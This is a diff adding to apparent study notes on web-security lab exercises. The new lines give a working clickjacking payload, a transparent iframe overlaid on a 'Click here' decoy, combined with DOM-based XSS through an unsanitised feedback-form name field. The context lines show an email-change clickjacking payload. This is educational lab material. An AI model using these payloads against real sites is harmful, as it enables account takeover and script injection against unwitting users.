@@ -37,3 +37,25 @@ We can exploit the iframe sandbox attribute to bypass this by assigning it to th
 <iframe src="https://0a2f00850357cb87b9c1f11a00e70021.web-security-academy.net/my-account?email=evil@hacker.net" sandbox="allow-forms">
 </iframe>
 ```
+
+- Exploiting clickjacking vulnerability to trigger DOM-based XSS
+  - Exploiting the sink in which the feedback form renders the name input without sanitization to inject an img tag which calls onprint. The URL has the hash #feedbackResult to position the screen futher down for the clickjacking overlay.
+```
+<style>
+iframe {
+    width: 1500px;
+    height: 800px;
+    position: abosolute;
+    opacity: 0.1;
+    z-index: 2;
+}
+div {
+    position: relative;
+    top: 740px;
+    left: 130px;
+    z-index: 1;
+}
+</style>
+<div>Click here</div>
+<iframe src="https://0ae60084045a3d9482a951c200d2005a.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=foo%40bar.com&subject=foo&message=foo#feedbackResult"></iframe>
+```
